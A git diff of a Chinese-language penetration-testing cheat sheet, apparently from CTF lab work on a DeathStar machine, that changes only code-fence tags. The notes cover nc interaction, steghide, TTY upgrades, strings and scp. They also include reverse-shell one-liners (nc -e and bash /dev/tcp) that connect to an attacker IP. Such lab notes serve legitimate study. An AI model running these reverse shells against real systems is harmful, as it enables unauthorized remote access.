@@ -15,7 +15,7 @@ tags:
 
 遇见非常规端口一般使用 nc 尝试进行交互，例如 DeathStar 靶机，开放了 UDP 1440 端口，尝试使用 nc 进行交互获得回显。
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ nc -u 10.10.10.45 1440
 ?
@@ -26,7 +26,7 @@ We'll notify Commander Tarkin of this offense
 
 使用 echo 传输字符串并通过 nc 链接端口。
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ echo "DS-1@OBS" | nc -u 10.10.10.45 1440
 ......
@@ -36,7 +36,7 @@ We'll notify Commander Tarkin of this offense
 
 图片分析一般先查看隐写情况。
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ steghide extract -sf x.jpg
 Enter passphrase:
@@ -48,7 +48,7 @@ Enter passphrase:
 
 在获得初始立足点后常常 bash 的交互性并不完善，通常使用 python 的 pty 库获得一个假的、交互性相对好的 bash。
 
-```
+```bash
 python3 -c "import pty;pty.spawn('/bin/bash');"
 ```
 
@@ -56,7 +56,7 @@ python3 -c "import pty;pty.spawn('/bin/bash');"
 
 也可以尝试下面的命令。
 
-```
+```bash
 script -qc /bin/bash /dev/null
 ```
 
@@ -66,7 +66,7 @@ script 时 Linux 系统自带的命令，用于记录终端会话。正常使用
 
 #### Linux
 
-```
+```shell
 nc -e /bin/bash 10.10.10.5 4444
 
 bash -c "/bin/bash -i >& /dev/tcp/10.10.10.5/4444 0>&1"
@@ -93,7 +93,7 @@ file 命令是识别文件类型和格式，通过分析文件头信息等数据
 最后的 `not stripped` 表明程序未进行符号剥离。这是对反编译而言非常利好的信息。因为这意味着程序的符号表、函数名、变量名、调试信息都被保留了下来，极大简化了反编译和逆向分析的难度，更容易直接恢复接近源代码的形式。、7
 
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ strings /bin/dartVader
 ```
@@ -106,14 +106,14 @@ strings 默认情况下会从文件中连续提取长度大于等于 4 的字符
 
 以下面这个命令为例，将 ssh 用户 erso 的 /bin/dartVader 文件下载到当前目录，指定 ssh 端口位 10110。
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ scp -P 10110 -q erso@10.110.10.45:/bin/dartVader .
 ```
 
 ### 使用 curl 将返回的内容输出为中文
 
-```
+```bash
 ┌──(kali㉿kali)-[~/Work/Kali]
 └─$ curl -s http://10.10.10.45/secret | trans -b :zh
 ```
